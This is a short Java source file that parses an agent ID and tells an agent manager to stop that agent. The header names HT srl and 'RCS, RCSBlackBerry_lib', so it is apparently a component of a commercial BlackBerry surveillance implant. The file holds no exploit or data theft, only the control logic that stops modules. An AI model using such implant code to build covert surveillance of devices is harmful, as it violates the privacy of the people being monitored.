/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry_lib 
 * File         : StopAgentAction.java 
 * Created      : 26-mar-2010
 * *************************************************/
package com.ht.rcs.blackberry.action;

import java.io.EOFException;

import net.rim.device.api.util.DataBuffer;

import com.ht.rcs.blackberry.AgentManager;
import com.ht.rcs.blackberry.event.Event;

public class StopAgentAction extends SubAction {

    int agentId;

    public StopAgentAction(int actionId_, byte[] confParams) {
        super(actionId_);
        parse(confParams);
    }

    public boolean execute(Event triggeringEvent) {
        // #debug
        debug.info("Stopping " + agentId);
        AgentManager agentManager = AgentManager.getInstance();

        boolean ret = agentManager.stop(agentId);
        // disable?
        return ret;
    }

    protected boolean parse(byte[] confParams) {
        DataBuffer databuffer = new DataBuffer(confParams, 0,
                confParams.length, false);

        try {
            agentId = databuffer.readInt();
            // #debug
            debug.trace("agentId: " + agentId);

        } catch (EOFException e) {
            // #debug
            debug.error("params FAILED");
            return false;
        }

        return true;
    }

}
